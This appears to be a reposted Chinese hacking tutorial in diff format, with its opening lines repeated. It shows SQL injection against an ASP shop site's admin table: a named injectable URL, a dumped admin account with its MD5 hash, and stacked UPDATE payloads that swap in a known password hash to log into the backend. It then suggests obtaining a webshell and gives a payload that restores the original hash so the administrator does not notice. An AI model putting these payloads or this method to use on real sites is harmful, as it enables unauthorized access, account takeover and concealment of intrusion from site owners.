@@ -1,0 +1,26 @@
+注入点已经找到：http://0daynet.com/book.asp?id=1996
+我刚已经用NB检测过了。可以看到，存在表段 shop_admin。
+可是密码是MD5加密的：[adminid]:24 [admin]:zhuyaod [password]:d4716077c2ba075c
+我们来尝试欺骗
+-
+
+注入点已经找到：http://0daynet.com/book.asp?id=1996
+我刚已经用NB检测过了。可以看到，存在表段 shop_admin。
+可是密码是MD5加密的：[adminid]:24 [admin]:zhuyaod [password]:d4716077c2ba075c
+我们来尝试欺骗。可以看出，欺骗是没戏滴。
+那咋办？难道要跑密码？那得浪费多少时间和内存啊？
+下面我来介绍一种新方法：注射。注射的语句如下：
+;update shop_admin set password='新MD5加密密码' where password='d4716077c2ba075c'--
+比如，我需要把zhuyaod的密码改成wmmhacker，我们首先要先获得wmmhacker通过MD5加密后的十二
+
+位密码
+这里用明小子的工具就能转换了。wmmhacker - f8dc763194f29433
+;update shop_admin set password='f8dc763194f29433' where password='d4716077c2ba075c'--
+我们来测试。看见了，页面没有返回错误，表示成功了。
+现在我们对shop_admin表段下的密码做重新解猜。
+[adminid]:24 [admin]:zhuyaod [password]:f8dc763194f29433
+大家对比一下，已经改变了。现在我们可以登陆了。
+进来了。呵呵。就到这里了吧。值得提一句的是，我们进了后台，然后想办法拿到WEBSHELL。
+接着，别忘了把管理员密码还原。不然他会发现滴！
+;update shop_admin set password='d4716077c2ba075c' where password='f8dc763194f29433'--
+本篇文章来源于[0day网络]|[0day Network]|exploit|vulnerability Www.0daynet.Com 原文链接：http://www.0daynet.com/2010/0821/1064.html
